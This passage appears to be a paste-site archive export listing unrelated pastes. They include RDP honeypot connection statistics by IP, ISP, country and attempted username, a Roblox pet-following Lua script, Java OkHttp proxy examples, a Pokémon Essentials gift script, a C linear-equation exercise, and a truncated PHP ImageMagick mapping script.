    ""AS140810"": 6,
    ""AS204428"": 18,
    ""AS197414"": 6,
    ""AS48721"": 18,
    ""AS131939"": 3,
    ""AS267784"": 6,
    ""AS135377"": 3,
    ""AS13886"": 6,
    ""AS59425"": 18,
    ""AS7713"": 6,
    ""AS133676"": 3,
    ""AS4837"": 3,
    ""AS56046"": 3,
    ""AS49505"": 9,
    ""AS209588"": 18,
    ""AS63949"": 75,
    ""AS37963"": 6,
    ""AS44066"": 6,
    ""AS14061"": 225,
    ""AS398705"": 3
  },
  ""isp"": {
    ""Censys, Inc."": 6,
    ""Total Play Telecomunicaciones SA De CV"": 3,
    ""Xhost Internet Solutions LP"": 24,
    ""SPT"": 3,
    ""Input Output Flood LLC"": 6,
    ""Google LLC"": 36,
    ""MAYTINHVPSTTT"": 6,
    ""SS-Net"": 18,
    ""Flyservers S.A."": 42,
    ""IPS INC"": 3,
    ""Zenlayer Inc"": 3,
    ""Cogent Communications"": 6,
    ""Horizon LLC"": 18,
    ""PT Telekomunikasi Indonesia"": 6,
    ""Precious netcom pvt ltd"": 3,
    ""China Unicom CHINA169 Network"": 3,
    ""China Mobile Communications Corporation"": 3,
    ""OOO \""Network of data-centers \""Selectel\"""": 9,
    ""Akamai Technologies"": 75,
    ""Hangzhou Alibaba Advertising Co"": 6,
    ""www.accelerated.de"": 6,
    ""DigitalOcean, LLC"": 225
  },
  ""org"": {
    ""Censys, Inc"": 3,
    ""Total Play Telecomunicaciones SA De CV"": 3,
    ""Xhost Internet Solutions"": 18,
    ""Saigon Postel Corporation"": 3,
    ""DemonVPS"": 6,
    ""Palo Alto Networks, Inc"": 36,
    ""Vpsttt Computer Company Limited"": 6,
    ""4Media Ltd"": 18,
    ""Xhostis"": 6,
    ""Flyservers S.A"": 18,
    ""IPS Inc"": 3,
    ""UAB Host Baltic"": 6,
    ""UCLOUD"": 3,
    ""Cloud South"": 6,
    ""Horizon LLC"": 18,
    ""Telekomunikasi Indonesia"": 6,
    ""Gstech Software Systems Pvt Ltd"": 3,
    ""China United Network Communications Corporation Limited"": 3,
    ""China Mobile Communications Corporation"": 3,
    ""Unknown"": 9,
    ""Alviva Holding Limited"": 18,
    ""Linode"": 75,
    ""Aliyun Computing Co., LTD"": 6,
    ""diva-e Datacenters GmbH"": 6,
    ""DigitalOcean, LLC"": 225,
    ""Censys, Inc."": 3
  },
  ""regionName"": {
    ""Michigan"": 3,
    ""Hidalgo"": 3,
    ""North Holland"": 24,
    ""B\u1eafc Ninh Province"": 3,
    ""Arizona"": 6,
    ""California"": 36,
    ""Ho Chi Minh"": 6,
    ""Sliven"": 18,
    ""Kaunas"": 18,
    ""Tokyo"": 3,
    ""Vilnius"": 6,
    ""Taiwan"": 3,
    ""Florida"": 6,
    ""Moscow"": 27,
    ""Jakarta"": 6,
    ""Uttarakhand"": 3,
    ""Beijing"": 9,
    ""Jiangsu"": 3,
    ""Hesse"": 27,
    ""Central Singapore"": 75,
    ""England"": 225
  },
  ""country"": {
    ""United States"": 51,
    ""Mexico"": 3,
    ""The Netherlands"": 24,
    ""Vietnam"": 9,
    ""Bulgaria"": 18,
    ""Lithuania"": 24,
    ""Japan"": 3,
    ""Taiwan"": 3,
    ""Russia"": 27,
    ""Indonesia"": 6,
    ""India"": 3,
    ""China"": 12,
    ""Germany"": 27,
    ""Singapore"": 75,
    ""United Kingdom"": 225
  },
  ""account"": {
    ""(empty)"": 12,
    ""wRfIfHe"": 3,
    ""Administr"": 42,
    ""hello"": 33,
    ""uTKcXDKGS"": 3,
    ""yhAXxU"": 3,
    ""BwriBW"": 3,
    ""Test"": 42,
    ""Administrator"": 144,
    ""QneOhJmMk"": 3,
    ""JESVQM"": 3,
    ""zGAkZo"": 3,
    ""Domain"": 39,
    ""ZzZJrMBZN"": 3,
    ""opxRsT"": 3,
    ""FIaYEL"": 3,
    ""Admin"": 66,
    ""Whatuptime.com"": 66,
    ""Jakartakini123#"": 27,
    ""zgpzevXlO"": 3,
    ""FqXjdk"": 3,
    ""RwFGhp"": 3
  },
  ""keyboard"": {
    ""Unknown"": 510
  },
  ""client_build"": {
    ""Unknown"": 510
  },
  ""client_name"": {
    ""Unknown"": 510
  },
  ""ip_type"": {
    ""Unknown"": 138,
    ""mobile"": 6,
    ""hosting"": 141,
    ""hosting & proxy"": 225
  }
}"
aRS6tHKc,2024-04-29_stats.json,rdp_snitch,JSON,Monday 29th of April 2024 07:16:08 PM CDT,"{
  ""ip"": {
    ""167.94.138.49"": 2,
    ""187.190.60.112"": 2,
    ""87.251.75.145"": 6,
    ""180.93.172.108"": 2,
    ""107.167.82.123"": 4,
    ""205.210.31.67"": 6,
    ""103.238.234.199"": 4,
    ""212.70.149.142"": 12,
    ""185.170.144.3"": 4,
    ""194.165.16.11"": 4,
    ""103.120.19.98"": 2,
    ""87.251.75.120"": 4,
    ""45.227.254.26"": 4,
    ""128.14.239.39"": 2,
    ""154.27.71.58"": 4,
    ""198.235.24.57"": 6,
    ""62.204.41.225"": 8,
    ""36.91.222.100"": 4,
    ""43.250.254.49"": 2,
    ""116.140.196.215"": 2,
    ""112.4.139.162"": 2,
    ""212.41.9.9"": 6,
    ""198.235.24.143"": 6,
    ""81.19.135.47"": 12,
    ""172.104.185.182"": 50,
    ""123.56.20.194"": 4,
    ""80.66.76.134"": 2,
    ""84.201.2.2"": 4,
    ""159.65.82.237"": 150,
    ""62.204.41.215"": 4,
    ""194.165.16.73"": 8,
    ""167.94.146.48"": 2,
    ""205.210.31.207"": 6
  },
  ""asn"": {
    ""AS398324"": 2,
    ""AS22884"": 2,
    ""AS208091"": 12,
    ""AS135944"": 2,
    ""AS53755"": 4,
    ""AS396982"": 24,
    ""AS140810"": 4,
    ""AS204428"": 12,
    ""AS197414"": 4,
    ""AS48721"": 12,
    ""AS131939"": 2,
    ""AS267784"": 4,
    ""AS135377"": 2,
    ""AS13886"": 4,
    ""AS59425"": 12,
    ""AS7713"": 4,
    ""AS133676"": 2,
    ""AS4837"": 2,
    ""AS56046"": 2,
    ""AS49505"": 6,
    ""AS209588"": 12,
    ""AS63949"": 50,
    ""AS37963"": 4,
    ""AS44066"": 4,
    ""AS14061"": 150,
    ""AS398705"": 2
  },
  ""isp"": {
    ""Censys, Inc."": 4,
    ""Total Play Telecomunicaciones SA De CV"": 2,
    ""Xhost Internet Solutions LP"": 16,
    ""SPT"": 2,
    ""Input Output Flood LLC"": 4,
    ""Google LLC"": 24,
    ""MAYTINHVPSTTT"": 4,
    ""SS-Net"": 12,
    ""Flyservers S.A."": 28,
    ""IPS INC"": 2,
    ""Zenlayer Inc"": 2,
    ""Cogent Communications"": 4,
    ""Horizon LLC"": 12,
    ""PT Telekomunikasi Indonesia"": 4,
    ""Precious netcom pvt ltd"": 2,
    ""China Unicom CHINA169 Network"": 2,
    ""China Mobile Communications Corporation"": 2,
    ""OOO \""Network of data-centers \""Selectel\"""": 6,
    ""Akamai Technologies"": 50,
    ""Hangzhou Alibaba Advertising Co"": 4,
    ""www.accelerated.de"": 4,
    ""DigitalOcean, LLC"": 150
  },
  ""org"": {
    ""Censys, Inc"": 2,
    ""Total Play Telecomunicaciones SA De CV"": 2,
    ""Xhost Internet Solutions"": 12,
    ""Saigon Postel Corporation"": 2,
    ""DemonVPS"": 4,
    ""Palo Alto Networks, Inc"": 24,
    ""Vpsttt Computer Company Limited"": 4,
    ""4Media Ltd"": 12,
    ""Xhostis"": 4,
    ""Flyservers S.A"": 12,
    ""IPS Inc"": 2,
    ""UAB Host Baltic"": 4,
    ""UCLOUD"": 2,
    ""Cloud South"": 4,
    ""Horizon LLC"": 12,
    ""Telekomunikasi Indonesia"": 4,
    ""Gstech Software Systems Pvt Ltd"": 2,
    ""China United Network Communications Corporation Limited"": 2,
    ""China Mobile Communications Corporation"": 2,
    ""Unknown"": 6,
    ""Alviva Holding Limited"": 12,
    ""Linode"": 50,
    ""Aliyun Computing Co., LTD"": 4,
    ""diva-e Datacenters GmbH"": 4,
    ""DigitalOcean, LLC"": 150,
    ""Censys, Inc."": 2
  },
  ""regionName"": {
    ""Michigan"": 2,
    ""Hidalgo"": 2,
    ""North Holland"": 16,
    ""B\u1eafc Ninh Province"": 2,
    ""Arizona"": 4,
    ""California"": 24,
    ""Ho Chi Minh"": 4,
    ""Sliven"": 12,
    ""Kaunas"": 12,
    ""Tokyo"": 2,
    ""Vilnius"": 4,
    ""Taiwan"": 2,
    ""Florida"": 4,
    ""Moscow"": 18,
    ""Jakarta"": 4,
    ""Uttarakhand"": 2,
    ""Beijing"": 6,
    ""Jiangsu"": 2,
    ""Hesse"": 18,
    ""Central Singapore"": 50,
    ""England"": 150
  },
  ""country"": {
    ""United States"": 34,
    ""Mexico"": 2,
    ""The Netherlands"": 16,
    ""Vietnam"": 6,
    ""Bulgaria"": 12,
    ""Lithuania"": 16,
    ""Japan"": 2,
    ""Taiwan"": 2,
    ""Russia"": 18,
    ""Indonesia"": 4,
    ""India"": 2,
    ""China"": 8,
    ""Germany"": 18,
    ""Singapore"": 50,
    ""United Kingdom"": 150
  },
  ""account"": {
    ""(empty)"": 8,
    ""wRfIfHe"": 2,
    ""Administr"": 28,
    ""hello"": 22,
    ""uTKcXDKGS"": 2,
    ""yhAXxU"": 2,
    ""BwriBW"": 2,
    ""Test"": 28,
    ""Administrator"": 96,
    ""QneOhJmMk"": 2,
    ""JESVQM"": 2,
    ""zGAkZo"": 2,
    ""Domain"": 26,
    ""ZzZJrMBZN"": 2,
    ""opxRsT"": 2,
    ""FIaYEL"": 2,
    ""Admin"": 44,
    ""Whatuptime.com"": 44,
    ""Jakartakini123#"": 18,
    ""zgpzevXlO"": 2,
    ""FqXjdk"": 2,
    ""RwFGhp"": 2
  },
  ""keyboard"": {
    ""Unknown"": 340
  },
  ""client_build"": {
    ""Unknown"": 340
  },
  ""client_name"": {
    ""Unknown"": 340
  },
  ""ip_type"": {
    ""Unknown"": 92,
    ""mobile"": 4,
    ""hosting"": 94,
    ""hosting & proxy"": 150
  }
}"
Dc1ZWmj8,2024-04-29_stats.json,rdp_snitch,JSON,Monday 29th of April 2024 07:15:08 PM CDT,"{
  ""ip"": {
    ""167.94.138.49"": 1,
    ""187.190.60.112"": 1,
    ""87.251.75.145"": 3,
    ""180.93.172.108"": 1,
    ""107.167.82.123"": 2,
    ""205.210.31.67"": 3,
    ""103.238.234.199"": 2,
    ""212.70.149.142"": 6,
    ""185.170.144.3"": 2,
    ""194.165.16.11"": 2,
    ""103.120.19.98"": 1,
    ""87.251.75.120"": 2,
    ""45.227.254.26"": 2,
    ""128.14.239.39"": 1,
    ""154.27.71.58"": 2,
    ""198.235.24.57"": 3,
    ""62.204.41.225"": 4,
    ""36.91.222.100"": 2,
    ""43.250.254.49"": 1,
    ""116.140.196.215"": 1,
    ""112.4.139.162"": 1,
    ""212.41.9.9"": 3,
    ""198.235.24.143"": 3,
    ""81.19.135.47"": 6,
    ""172.104.185.182"": 25,
    ""123.56.20.194"": 2,
    ""80.66.76.134"": 1,
    ""84.201.2.2"": 2,
    ""159.65.82.237"": 75,
    ""62.204.41.215"": 2,
    ""194.165.16.73"": 4,
    ""167.94.146.48"": 1,
    ""205.210.31.207"": 3
  },
  ""asn"": {
    ""AS398324"": 1,
    ""AS22884"": 1,
    ""AS208091"": 6,
    ""AS135944"": 1,
    ""AS53755"": 2,
    ""AS396982"": 12,
    ""AS140810"": 2,
    ""AS204428"": 6,
    ""AS197414"": 2,
    ""AS48721"": 6,
    ""AS131939"": 1,
    ""AS267784"": 2,
    ""AS135377"": 1,
    ""AS13886"": 2,
    ""AS59425"": 6,
    ""AS7713"": 2,
    ""AS133676"": 1,
    ""AS4837"": 1,
    ""AS56046"": 1,
    ""AS49505"": 3,
    ""AS209588"": 6,
    ""AS63949"": 25,
    ""AS37963"": 2,
    ""AS44066"": 2,
    ""AS14061"": 75,
    ""AS398705"": 1
  },
  ""isp"": {
    ""Censys, Inc."": 2,
    ""Total Play Telecomunicaciones SA De CV"": 1,
    ""Xhost Internet Solutions LP"": 8,
    ""SPT"": 1,
    ""Input Output Flood LLC"": 2,
    ""Google LLC"": 12,
    ""MAYTINHVPSTTT"": 2,
    ""SS-Net"": 6,
    ""Flyservers S.A."": 14,
    ""IPS INC"": 1,
    ""Zenlayer Inc"": 1,
    ""Cogent Communications"": 2,
    ""Horizon LLC"": 6,
    ""PT Telekomunikasi Indonesia"": 2,
    ""Precious netcom pvt ltd"": 1,
    ""China Unicom CHINA169 Network"": 1,
    ""China Mobile Communications Corporation"": 1,
    ""OOO \""Network of data-centers \""Selectel\"""": 3,
    ""Akamai Technologies"": 25,
    ""Hangzhou Alibaba Advertising Co"": 2,
    ""www.accelerated.de"": 2,
    ""DigitalOcean, LLC"": 75
  },
  ""org"": {
    ""Censys, Inc"": 1,
    ""Total Play Telecomunicaciones SA De CV"": 1,
    ""Xhost Internet Solutions"": 6,
    ""Saigon Postel Corporation"": 1,
    ""DemonVPS"": 2,
    ""Palo Alto Networks, Inc"": 12,
    ""Vpsttt Computer Company Limited"": 2,
    ""4Media Ltd"": 6,
    ""Xhostis"": 2,
    ""Flyservers S.A"": 6,
    ""IPS Inc"": 1,
    ""UAB Host Baltic"": 2,
    ""UCLOUD"": 1,
    ""Cloud South"": 2,
    ""Horizon LLC"": 6,
    ""Telekomunikasi Indonesia"": 2,
    ""Gstech Software Systems Pvt Ltd"": 1,
    ""China United Network Communications Corporation Limited"": 1,
    ""China Mobile Communications Corporation"": 1,
    ""Unknown"": 3,
    ""Alviva Holding Limited"": 6,
    ""Linode"": 25,
    ""Aliyun Computing Co., LTD"": 2,
    ""diva-e Datacenters GmbH"": 2,
    ""DigitalOcean, LLC"": 75,
    ""Censys, Inc."": 1
  },
  ""regionName"": {
    ""Michigan"": 1,
    ""Hidalgo"": 1,
    ""North Holland"": 8,
    ""B\u1eafc Ninh Province"": 1,
    ""Arizona"": 2,
    ""California"": 12,
    ""Ho Chi Minh"": 2,
    ""Sliven"": 6,
    ""Kaunas"": 6,
    ""Tokyo"": 1,
    ""Vilnius"": 2,
    ""Taiwan"": 1,
    ""Florida"": 2,
    ""Moscow"": 9,
    ""Jakarta"": 2,
    ""Uttarakhand"": 1,
    ""Beijing"": 3,
    ""Jiangsu"": 1,
    ""Hesse"": 9,
    ""Central Singapore"": 25,
    ""England"": 75
  },
  ""country"": {
    ""United States"": 17,
    ""Mexico"": 1,
    ""The Netherlands"": 8,
    ""Vietnam"": 3,
    ""Bulgaria"": 6,
    ""Lithuania"": 8,
    ""Japan"": 1,
    ""Taiwan"": 1,
    ""Russia"": 9,
    ""Indonesia"": 2,
    ""India"": 1,
    ""China"": 4,
    ""Germany"": 9,
    ""Singapore"": 25,
    ""United Kingdom"": 75
  },
  ""account"": {
    ""(empty)"": 4,
    ""wRfIfHe"": 1,
    ""Administr"": 14,
    ""hello"": 11,
    ""uTKcXDKGS"": 1,
    ""yhAXxU"": 1,
    ""BwriBW"": 1,
    ""Test"": 14,
    ""Administrator"": 48,
    ""QneOhJmMk"": 1,
    ""JESVQM"": 1,
    ""zGAkZo"": 1,
    ""Domain"": 13,
    ""ZzZJrMBZN"": 1,
    ""opxRsT"": 1,
    ""FIaYEL"": 1,
    ""Admin"": 22,
    ""Whatuptime.com"": 22,
    ""Jakartakini123#"": 9,
    ""zgpzevXlO"": 1,
    ""FqXjdk"": 1,
    ""RwFGhp"": 1
  },
  ""keyboard"": {
    ""Unknown"": 170
  },
  ""client_build"": {
    ""Unknown"": 170
  },
  ""client_name"": {
    ""Unknown"": 170
  },
  ""ip_type"": {
    ""Unknown"": 46,
    ""mobile"": 2,
    ""hosting"": 47,
    ""hosting & proxy"": 75
  }
}"
zCyxtz4D,Untitled,Med_Gaming,Lua,Monday 29th of April 2024 07:08:41 PM CDT,"local RunService = game:GetService(""RunService"")
local Players = game:GetService(""Players"")
local ReplicatedStorage = game:GetService(""ReplicatedStorage"")

local PetFolder = game.Workspace:WaitForChild(""Units"")

local Spacing =	4
local MaxClimbHeight = 6

local RayParams = RaycastParams.new()
local RayDirection = Vector3.new(0, -500, 0)

local function RearrangeTables(Pets, Rows, MaxRowCapacity)
	table.clear(Rows)
	local AmountOfRows = math.ceil(#Pets / MaxRowCapacity)
	for i = 1, AmountOfRows do
		table.insert(Rows, {})
	end
	for i, v in Pets do
		local Row = Rows[math.ceil(i / MaxRowCapacity)]
		table.insert(Row, v)
	end
end

local function GetRowWidth(Row, Pet)
	if Pet ~= nil then
		local SpacingBetweenPets = Spacing - Pet.PrimaryPart.Size.X
		local RowWidth = 0

		if #Row == 1 then
			return 0
		end

		for i,v in Row do
			if i ~= #Row then
				RowWidth += Pet.PrimaryPart.Size.X + SpacingBetweenPets
			else
				RowWidth += Pet.PrimaryPart.Size.X
			end
		end

		return RowWidth
	end
end

RunService.Heartbeat:Connect(function(Delatime)
	for _, PlayerPetFolder in PetFolder:GetChildren() do
		task.spawn(function()
			if not Players:FindFirstChild(PlayerPetFolder.Name) then return end
			local Character = Players[PlayerPetFolder.Name].Character
			if not Character then return end
			local HumanoidRootPart = Character:FindFirstChild(""HumanoidRootPart"")
			local Humanoid:Humanoid = Character:FindFirstChild(""Humanoid"")
			if Character == nil or HumanoidRootPart == nil or Humanoid == nil then return end

			local Pets = {}
			local Rows = {}
			for _, Pet in PlayerPetFolder:GetChildren() do
				table.insert(Pets, Pet)
			end
			RayParams.FilterDescendantsInstances = {PetFolder, Character}
			local MaxRowCapacity = math.ceil(math.sqrt(#Pets))
			RearrangeTables(Pets, Rows, MaxRowCapacity)

			for i, Pet in Pets do
				if not Pet:FindFirstChild(""HumanoidRootPart"") then continue end
				local RowIndex = math.ceil(i / MaxRowCapacity)
				local Row = Rows[RowIndex]
				local RowWidth = GetRowWidth(Row, Pet)

				local XOffset = #Row == 1 and 0 or RowWidth/2 - Pet.PrimaryPart.Size.X/2
				local X = (table.find(Row, Pet) - 1) * Spacing
				local Z = RowIndex * Spacing
				local Y = 0

				local RayResult = game.Workspace:Blockcast(Pet.PrimaryPart.CFrame + Vector3.new(0, MaxClimbHeight, 0), Pet.PrimaryPart.Size, RayDirection, RayParams)

				if RayResult then
					Y = RayResult.Position.Y + Pet.PrimaryPart.Size.Y/2
				end

				local TargetCFrame = CFrame.new(HumanoidRootPart.CFrame.X, 0, HumanoidRootPart.CFrame.Z) * HumanoidRootPart.CFrame.Rotation * CFrame.new(X - XOffset, Y, Z)

				if Humanoid.MoveDirection.Magnitude > 0 then
					local Val = Pet:FindFirstChild(""Running"") or Instance.new(""BoolValue"", Pet)
					Val.Name = ""Running""
					if not Val.Value then
						Val.Value = true
						Pet:WaitForChild(""Humanoid""):LoadAnimation(script.Anim):Play()					
					end
				else
					for i, v in pairs(Pet:WaitForChild(""Humanoid""):GetPlayingAnimationTracks()) do
						v:Stop()
					end
					game.Debris:AddItem(Pet:FindFirstChild(""Running""), 0)
				end

				Pet.PrimaryPart.CFrame = Pet.PrimaryPart.CFrame:Lerp(TargetCFrame, 0.1)
			end
		end)
	end
end)"
KSHvpSaf,Untitled,dereksir,Bash,Monday 29th of April 2024 07:03:42 PM CDT,"{
  ""origin"": ""140.238.247.9:63509""
}"
nSgCPwBT,Untitled,dereksir,Java,Monday 29th of April 2024 07:01:58 PM CDT,"package com.example;

// import the required classes
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

import java.io.IOException;
import java.net.InetSocketAddress;
import java.net.Proxy;

public class Main {
    String run(String url) throws IOException {
        // define your proxy details
        String proxyHost = ""140.238.247.9"";
        int proxyPort = 8100;

        // create a proxy object and pass in the necessary details
        Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(proxyHost, proxyPort));

        // create a OkHttpClient builder instance and configure it to use the proxy
        OkHttpClient client = new OkHttpClient.Builder()
            .proxy(proxy) 
            .build();

        // create a request with the provided URL
        Request request = new Request.Builder()
            .url(url)
            .build();
        // execute the request and obtain the response
        try (Response response = client.newCall(request).execute()) {
            // return the response body as a string
            return response.body().string();
        }
    }

    public static void main(String[] args) throws IOException {
        // create an instance of the Main class
        Main example = new Main();
        // make a GET request to the specified URL and print the response
        String response = example.run(""https://httpbin.io/ip"");
        System.out.println(response);
    }
}"
yBEJU4Vi,Untitled,dereksir,Java,Monday 29th of April 2024 06:49:12 PM CDT,"public class Main {
    String run(String url) throws IOException {
		//...

        // create a OkHttpClient builder instance and configure it to use the proxy
        OkHttpClient client = new OkHttpClient.Builder()
            .proxy(proxy) 
            .build();
    }
}
"
1RdEHny1,Untitled,dereksir,Java,Monday 29th of April 2024 06:39:13 PM CDT,"public class Main {

    String run(String url) throws IOException {
        // define your proxy details
        String proxyHost = ""140.238.247.9"";
        int proxyPort = 8100;

        // create a proxy object and pass in the necessary details
        Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(proxyHost, proxyPort));
	}
}"
im3UtAj7,Untitled,Falexom,C,Monday 29th of April 2024 06:21:46 PM CDT,i don't know how to sex
385HfTqs,Untitled,dereksir,Java,Monday 29th of April 2024 06:11:33 PM CDT,"package com.example;

// import the required classes
import java.io.IOException;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

public class Main {
    // create a new OkHttpClient instance
    final OkHttpClient client = new OkHttpClient();

    String run(String url) throws IOException {
        // create a request with the provided URL
        Request request = new Request.Builder()
            .url(url)
            .build();
        // execute the request and obtain the response
        try (Response response = client.newCall(request).execute()) {
            // return the response body as a string
            return response.body().string();
        }
    }

    public static void main(String[] args) throws IOException {
        // create an instance of the Main class
        Main example = new Main();
        // make a GET request to the specified URL and print the response
        String response = example.run(""https://httpbin.io/ip"");
        System.out.println(response);
    }
}"
pWtyR7m2,Gift_Basic,FiaPlay,Ruby,Monday 29th of April 2024 06:08:29 PM CDT,"####################################################
# BASE DE REGALO MISTERIOSO PARA EL SCRIPT DE REGALOS MISTERIOSOS AVANZADOS DE CLARA
# Tómalo de base para crear o añadir nuevos eventos. Puedes entregar más de un evento a la vez.
# Subelo a Pastebin o a Github como un txt y coge el enlace del archivo en RAW.
####################################################
  ret = false
  #Comprueba que el jugador ya tenga ese regalo especifico, para objetos es mejor usar otro tipo de check.
  #Para pokemon con evolucion, debes comprobar que esten ambas especies.
    if !hasEventMon?(PBSpecies::PICHU,:CLASSIC,""PRI2010"") 
    Kernel.pbMessage(_INTL(""Regalo Misterioso en línea encontrado.\\wtnp[20]""))
    @pokemon=PokeBattle_Pokemon.new(:PICHU,30,$Trainer)
    #ESTOS PARAMETROS SON PARA EL CHECK de hasEventMon?#
    @pokemon.giveRibbon(PBRibbons::CLASSIC)
    @pokemon.ot=""PRI2010""
    ####################################################
    @pokemon.trainerID=03050
    @pokemon.setItem(:EVERSTONE)
    @pokemon.pbLearnMove(:VOLTTACKLE)
    @pokemon.pbLearnMove(:ENDEAVOR)
    @pokemon.pbLearnMove(:ENDURE)
    @pokemon.makeShiny
    @pokemon.setNature(:JOLLY)
    #Esto permite aleatorizar los iv's del pokémon, pero garantiza que 3 de ellos sean perfectos.
    maxIV = 1
    @pokemon.iv[rand(6)]=31
    randivs = [0,1,2,3,4,5]
    for i in randivs.shuffle
      next if @pokemon.iv[i]==31
      maxIV +=1
      @pokemon.iv[i]=31 
      break if maxIV>=3
    end
    @pokemon.happiness=100
    @pokemon.obtainMode=4
    @pokemon.calcStats
    showHidePokemon rescue nil
    Kernel.pbAddPokemon(@pokemon,nil,true,false)
    showHidePokemon(false) rescue nil
    ret = true
  end
  if !hasEventMon?(PBSpecies::CELEBI,:CLASSIC,""INV2011"") 
    Kernel.pbMessage(_INTL(""Regalo Misterioso en línea encontrado.\\wtnp[20]""))
    @pokemon=PokeBattle_Pokemon.new(:CELEBI,50,$Trainer)
    #ESTOS PARAMETROS SON PARA EL CHECK de hasEventMon?#
    @pokemon.giveRibbon(PBRibbons::CLASSIC)
    @pokemon.ot=""INV2011""
    ####################################################
    @pokemon.trainerID=01211
    @pokemon.setItem(:JABOCABERRY)
    @pokemon.pbLearnMove(:HEALINGWISH)
    @pokemon.setNature(:MODEST)
    #Esto permite aleatorizar los iv's del pokémon, pero garantiza que 3 de ellos sean perfectos.
    maxIV = 1
    @pokemon.iv[rand(6)]=31
    randivs = [0,1,2,3,4,5]
    for i in randivs.shuffle
      next if @pokemon.iv[i]==31
      maxIV +=1
      @pokemon.iv[i]=31 
      break if maxIV>=3
    end
    @pokemon.makeShiny
    @pokemon.happiness=100
    @pokemon.obtainMode=4
    @pokemon.calcStats
    showHidePokemon rescue nil
    Kernel.pbAddPokemon(@pokemon,nil,true,false)
    showHidePokemon(false) rescue nil
    ret = true
  end
  if !ret
    Kernel.pbMessage(_INTL(""No se encontró ningún Regalo Misterioso en línea.\\wtnp[20]""))
  end"
8WP5kLK5,2024_list4_linear,gpsgiraldi,C,Monday 29th of April 2024 05:15:50 PM CDT,"Um sistema de equações lineares 2×2
 consistente, da forma

{axdx++byey==cf
pode ser resolvido utilizando as fórmulas

xy=ce−bfae−bd=af−cdae−bd
Escreva um algoritmo em C para ler os coeficientes a,b,c,d,e,f
 das equações e calcular e exibir os valores de x
 e de y
.

Todos os números a,b,c,d,e,f
 serão inteiros, e x
 e y
 podem ser fracionários. Exiba x
 na primeira linha e y
 na segunda linha, ambos com duas casas decimais após a vírgula.
 
 ===================================
 #include <stdio.h>
#include <math.h>
 
int main()
{
    float a,b,c,d,e,f,x,y;
    printf(""Insira valores para a, b, c, d, e, e f a calcular x & y: "");
    scanf(""%f %f %f %f %f %f "", &a, &b, &c, &d, &e, &f);
    x = ((c*e)-(b*f))/((a*e)-(b*d));
    y = ((a*f)-(c*d))/((a*e)-(b*d));
    printf(""%.2f \n%.2f"", x, y);
    return 0;
}"
EhhJMjjG,ImageMagick,acclivity,PHP,Monday 29th of April 2024 04:59:30 PM CDT,"<?php

// This PHP code utilizes ImageMagick to perform image manipulation tasks similar to your Python code. 
// Note that you'll need to have the Imagick extension installed and enabled in your PHP environment to run this code. 
// Additionally, make sure to adjust the file paths and any other specifics according to your setup.


function map_creator($data) {
    $img = new Imagick('map_image.jpg');
    $draw = new ImagickDraw();
    $draw->setStrokeWidth(1);
    
    $data = str_replace(""\"""", """", $data);
    $data = str_replace(""\'"", """", $data);
    
    function compute_XY_from_GR($gr_east, $gr_north) {
        $base_es = 50481;
        $base_ns = 98019;
        $base_x = 644;
        $base_y = 534;
        
        $x = $base_x + (($gr_east - $base_es) * 0.3555);
        $y = $base_y - (($gr_north - $base_ns) * 0.355);
        
        $x_corr = ($y - $base_y) * 0.04;
        $x -= $x_corr;
        
        $y_corr = ($x - $base_x) * 0.025;
        $y += $y_corr;
        
        return array($x, $y);
    }
    
    function draw_cross($draw, $point, $pc, $age) {
        if ($pc > 20) {
            $sizer = 12;
        } elseif ($pc > 10) {
            $sizer = 9;
        } else {
            $sizer = 6;
        }
        
        $colors = array(""rgb(0,0,255)"", ""rgb(255,0,255)"", ""rgb(255,0,0)"", ""rgb(255,165,0)"", ""rgb(255,255,0)"");
        $idx = 0;
        if ($age < 2) {
            $idx = 4;
        } elseif ($age < 5) {
            $idx = 3;
        } elseif ($age < 10) {
            $idx = 2;
        } elseif ($age < 20) {
            $idx = 1;
        }
        
        $color = $colors[$idx];
        
        $draw->setStrokeColor($color);
        $draw->line($point[0] - $sizer, $point[1], $point[0] + $sizer, $point[1]);
        $draw->line($point[0], $point[1] - $sizer, $point[0], $point[1] + $sizer);
    }
    
    $now = time();
    $days = $now / 86400;
    $year_now = 1970 + intval($days / 365.25);
    
    $fsplit = explode(""*"", $data);
    $group = trim(array_shift($fsplit));
    
    $taxon = ucfirst(trim(array_shift($fsplit)));
    $vernac = ucfirst(trim(array_shift($fsplit)));   // Vernacular (Common) name
    $total = intval(trim(array_shift($fsplit)));    // Total number of sightings of this species
    
    $sp_refs = [];
    $griddata = $fsplit;                    // e.g. TV514989-1-2001/TV513989-7-1998/TV514990-1-2016/
    
    foreach ($griddata as $triple) {
        if (!$triple) {
            break;
        }
        $psplit = explode('~', $triple);
        $gr = $psplit[0];                              // get grid ref
        $gr = substr($gr, 0, 5) . ""50"" . substr($gr, 5) . ""50""; // Adjust grid rwf to centre of 100m square
        $ctr = $psplit[1];
        $year = $psplit[2];
        $sp_refs[] = array($gr, $ctr, $year);
    }
    
    $more = $vernac;
    if (strtolower($vernac) === strtolower($taxon)) {  // if common name is same
        $more = $group;
    }
    
    $more = ucfirst($more);
    
    $draw->setFontSize(12);
    $draw->setFillColor(""rgb(255,255,255)"");
    $draw->setFont('Arial');
    $img->annotateImage($draw, 675, 40, 0, $taxon);
    $img->annotateImage($draw, 675, 80, 0, $more);
    $img->annotateImage($draw, 675, 120, 0, ""$total sightings"");
    $img->annotateImage($draw, 1400, 240, 0, ""< 2 years"");
    $img->annotateImage($draw, 1400, 270, 0, ""< 5 years"");
    $img->annotateImage($draw, 1400, 300, 0, ""< 10 years"");
    $img->annotateImage($draw, 1400, 330, 0, ""< 20 years"");
    $img->annotateImage($draw, 1400, 360, 0, ""20 years+"");
    
    foreach ($sp_refs as $item) {
        $gr = $item[0];                    // Grid Ref
        $ctr = $item[1];                   // Qty seen at this Grid Ref
        $year = $item[2];                  // Year of most recent sighting at this Grid Ref
        $eastings = intval(substr($gr, 2, 5));         // split numeric part of Grid Ref into Eastings and Northings
        $northings = intval(substr($gr, 7));
        
        $ctr = intval($ctr);                                  // Qty seen at this location
        $pc = ($ctr * 100) / $total;                          // Percent qty seen at this location compared to all locations
        
        list($x, $y) = compute_XY_from_GR($eastings, $northings);      // Convert Grid Ref to pixel positions X, Y
        
        $aged = $year_now - intval($year);                     // Age of most recent sighting at this Grid Ref
        
        draw_cross($draw, array($x, $y), $pc, $aged );              // Draw a cross on the map at centre of this grid ref.
